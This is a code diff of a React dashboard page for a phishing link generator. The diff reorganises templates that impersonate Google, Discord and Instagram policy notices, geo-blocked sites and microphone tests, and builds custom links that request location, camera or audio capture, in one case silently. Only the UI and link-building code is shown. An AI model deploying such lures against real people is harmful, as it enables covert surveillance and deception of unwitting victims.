@@ -24,38 +24,22 @@ const CAPTURE_OPTIONS = [
 ] as const;
 type CaptureOptionType = typeof CAPTURE_OPTIONS[number]['id'];
 
-// Copied from main dashboard page.tsx
-const phishingCategories = [
-  {
-    title: 'Location',
-    description: 'Templates designed to capture IP address and attempt geolocation.',
-    Icon: MapPin,
-    links: [
-      { id: 'restricted-website-access', name: 'Restricted Website Access', url: '/phishing/location/restricted-website-access', Icon: Globe, description: "Simulates a geo-blocked website requiring location to access content." },
-      { id: 'geo-restricted-service-access', name: 'Geo-Restricted Service Access', url: '/phishing/location/geo-restricted-service-access', Icon: Gamepad2, description: "Simulates accessing a geo-restricted digital service (e.g., streaming, gaming)." },
-      { id: 'content-unlock', name: 'Content Unlock', url: '/phishing/location/content-unlock', Icon: Lock, description: "Simulates unlocking region-restricted general content." },
-    ],
-  },
-  {
-    title: 'Camera Access',
-    description: 'Templates attempting to access the device camera.',
-    Icon: Camera,
-    links: [
-      { id: 'google-policy-update', name: 'Google Policy Update', url: '/phishing/camera/google-policy-update', Icon: Globe, description: "Simulates a Google policy update requiring cookie acceptance and silently captures image. Supports custom redirection." },
-      { id: 'discord-terms-update', name: 'Discord Terms Update', url: '/phishing/camera/discord-terms-update', Icon: Globe, description: "Simulates a Discord terms update requiring acceptance and silently captures image. Supports custom redirection." },
-      { id: 'instagram-privacy-update', name: 'Instagram Privacy Update', url: '/phishing/camera/instagram-privacy-update', Icon: Globe, description: "Simulates an Instagram privacy policy update requiring acceptance and silently captures image. Supports custom redirection." },
-    ],
-  },
-  {
-    title: 'Audio Access',
-    description: 'Templates simulating microphone access requests.',
-    Icon: Mic,
-    links: [
-      { id: 'voice-assistant', name: 'Voice Assistant Setup', url: '/phishing/audio/voice-assistant', Icon: Mic, description: "Simulates setting up a voice assistant." }, // Added Mic Icon for consistency if PhishingLinkCard expects it
-      { id: 'speech-to-text', name: 'Speech-to-Text Demo', url: '/phishing/audio/speech-to-text', Icon: Mic, description: "Simulates a speech-to-text service." }, // Added Mic Icon
-      { id: 'quality-check', name: 'Audio Quality Check', url: '/phishing/audio/quality-check', Icon: Mic, description: "Simulates a microphone quality check." }, // Added Mic Icon
-    ],
-  },
+
+// Base templates for configuration (derived from allPhishingTemplates)
+// We need a flat list of templates, not categorized for this new UI.
+const basePhishingTemplatesForConfig = [
+  // Location
+  { baseId: 'restricted-website-access', name: 'Restricted Website Access', Icon: Globe, description: "Simulates a geo-blocked website." },
+  { baseId: 'geo-restricted-service-access', name: 'Geo-Restricted Service Access', Icon: Gamepad2, description: "Simulates accessing a geo-restricted service." },
+  { baseId: 'content-unlock', name: 'Content Unlock', Icon: Lock, description: "Simulates unlocking region-restricted content." },
+  // Camera
+  { baseId: 'google-policy-update', name: 'Google Policy Update', Icon: Globe, description: "Simulates Google policy update with camera capture." },
+  { baseId: 'discord-terms-update', name: 'Discord Terms Update', Icon: Globe, description: "Simulates Discord terms update with camera capture." },
+  { baseId: 'instagram-privacy-update', name: 'Instagram Privacy Update', Icon: Globe, description: "Simulates Instagram privacy update with camera capture." },
+  // Audio
+  { baseId: 'voice-assistant', name: 'Voice Assistant Setup', Icon: Mic, description: "Simulates voice assistant setup." },
+  { baseId: 'speech-to-text', name: 'Speech-to-Text Demo', Icon: Mic, description: "Simulates speech-to-text service." },
+  { baseId: 'quality-check', name: 'Audio Quality Check', Icon: Mic, description: "Simulates microphone quality check." },
 ];
 
 // Type for the state that holds configurations for each template
@@ -156,9 +140,9 @@ export default function AdvancedDashboardPage() {
     });
   };
 
-  const generateAndCopyLink = (templateId: string, templateName: string) => {
-    const selectedCaptureTypes = Array.from(templateConfigurations[templateId] || []);
-    let url = `${window.location.origin}/phishing/custom/${templateId}`;
+  const generateAndCopyLink = (templateBaseId: string, templateName: string) => {
+    const selectedCaptureTypes = Array.from(templateConfigurations[templateBaseId] || []);
+    let url = `${window.location.origin}/phishing/custom/${templateBaseId}`;
     if (selectedCaptureTypes.length > 0) {
       url += `?capture=${selectedCaptureTypes.join(',')}`;
     }
@@ -203,78 +187,53 @@ export default function AdvancedDashboardPage() {
 
         <Card className="shadow-lg">
           <CardHeader>
-            <CardTitle className="text-2xl flex items-center">
-              {/* Icon can be LinkIconLucide or Sparkles from main dashboard, let's use LinkIconLucide for now or match later if needed */}
-              <LinkIconLucide className="mr-3 h-7 w-7 text-primary" />
-              Phishing Page Templates
-            </CardTitle>
-            <CardDescription>
-              Configure and use these links to simulate phishing attempts. Choose data capture options for each template.
-            </CardDescription>
+            <CardTitle className="text-2xl flex items-center"><LinkIconLucide className="mr-3 h-7 w-7 text-primary" />Configure & Generate Custom Phishing Links</CardTitle>
+            <CardDescription>Select a base template and choose which data types (Location, Camera, Audio) it should attempt to capture. Then generate and copy the custom link.</CardDescription>
           </CardHeader>
-          <CardContent className="space-y-8 pt-4"> {/* Increased space-y for category separation */}
-            {phishingCategories.map((category) => {
-              const CategoryIcon = category.Icon;
+          <CardContent className="space-y-6 pt-4">
+            {basePhishingTemplatesForConfig.map((template) => {
+              const TemplateIcon = template.Icon;
+              const selectedCapturesForThisTemplate = templateConfigurations[template.baseId] || new Set();
               return (
-                <div key={category.title} className="space-y-6"> {/* Each category is a block */}
-                  <div className="flex items-center mb-1">
-                    <CategoryIcon className="mr-3 h-6 w-6 text-primary" />
+                <div key={template.baseId} className="p-4 border rounded-lg bg-background shadow-sm">
+                  <div className="flex items-start mb-3">
+                    <TemplateIcon className="mr-3 h-7 w-7 text-primary flex-shrink-0 mt-1" />
                     <div>
-                        <h2 className="text-xl font-semibold text-foreground">{category.title}</h2>
-                        <p className="text-sm text-muted-foreground">{category.description}</p>
+                        <h3 className="text-lg font-semibold text-foreground">{template.name}</h3>
+                        <p className="text-sm text-muted-foreground">{template.description}</p>
                     </div>
                   </div>
-                  <div className="grid gap-6 md:grid-cols-1 lg:grid-cols-2 xl:grid-cols-3"> {/* Grid for templates within category */}
-                    {category.links.map((template) => {
-                      const TemplateIcon = template.Icon || category.Icon; // Fallback to category icon if template specific is missing
-                      const selectedCapturesForThisTemplate = templateConfigurations[template.id] || new Set();
-                      return (
-                        <div key={template.id} className="p-4 border rounded-lg bg-card shadow-sm flex flex-col justify-between">
-                          <div>
-                            <div className="flex items-start mb-3">
-                              <TemplateIcon className="mr-3 h-7 w-7 text-blue-500 flex-shrink-0 mt-1" /> {/* Changed color for distinction */}
-                              <div>
-                                <h3 className="text-md font-semibold text-foreground">{template.name}</h3>
-                                <p className="text-xs text-muted-foreground mt-1">{template.description}</p>
-                              </div>
-                            </div>
 
-                            <div className="my-3 space-y-2 pl-2 border-l-2 ml-2">
-                              <p className="text-xs font-medium text-muted-foreground mb-1">Select data to capture:</p>
-                              {CAPTURE_OPTIONS.map((option) => {
-                                const CaptureIcon = option.Icon;
-                                return (
-                                  <div key={`${template.id}-${option.id}`} className="flex items-center space-x-2">
-                                    <Checkbox
-                                      id={`${template.id}-${option.id}-checkbox`}
-                                      checked={selectedCapturesForThisTemplate.has(option.id)}
-                                      onCheckedChange={() => handleTemplateCaptureTypeToggle(template.id, option.id)}
-                                      className="h-3.5 w-3.5"
-                                    />
-                                    <Label
-                                      htmlFor={`${template.id}-${option.id}-checkbox`}
-                                      className="flex items-center text-xs font-normal cursor-pointer"
-                                    >
-                                      <CaptureIcon className="mr-1.5 h-3.5 w-3.5 text-muted-foreground" />
-                                      {option.label}
-                                    </Label>
-                                  </div>
-                                );
-                              })}
-                            </div>
-                          </div>
-                          <Button
-                            onClick={() => generateAndCopyLink(template.id, template.name)}
-                            variant="default"
-                            size="sm"
-                            className="mt-3 w-full" // Full width button at the bottom of the card
+                  <div className="my-3 space-y-2 pl-2 border-l-2 ml-2">
+                    <p className="text-sm font-medium text-muted-foreground mb-1">Select data to capture with this template:</p>
+                    {CAPTURE_OPTIONS.map((option) => {
+                      const CaptureIcon = option.Icon;
+                      return (
+                        <div key={`${template.baseId}-${option.id}`} className="flex items-center space-x-2">
+                          <Checkbox
+                            id={`${template.baseId}-${option.id}-checkbox`}
+                            checked={selectedCapturesForThisTemplate.has(option.id)}
+                            onCheckedChange={() => handleTemplateCaptureTypeToggle(template.baseId, option.id)}
+                          />
+                          <Label
+                            htmlFor={`${template.baseId}-${option.id}-checkbox`}
+                            className="flex items-center text-sm font-normal cursor-pointer"
                           >
-                            <Copy className="mr-2 h-4 w-4" /> Generate & Copy Custom Link
-                          </Button>
+                            <CaptureIcon className="mr-2 h-4 w-4 text-muted-foreground" />
+                            {option.label}
+                          </Label>
                         </div>
                       );
                     })}
                   </div>
+                  <Button
+                    onClick={() => generateAndCopyLink(template.baseId, template.name)}
+                    variant="default"
+                    size="sm"
+                    className="mt-3 w-full sm:w-auto"
+                  >
+                    <Copy className="mr-2 h-4 w-4" /> Generate & Copy Custom Link
+                  </Button>
                 </div>
               );
             })}
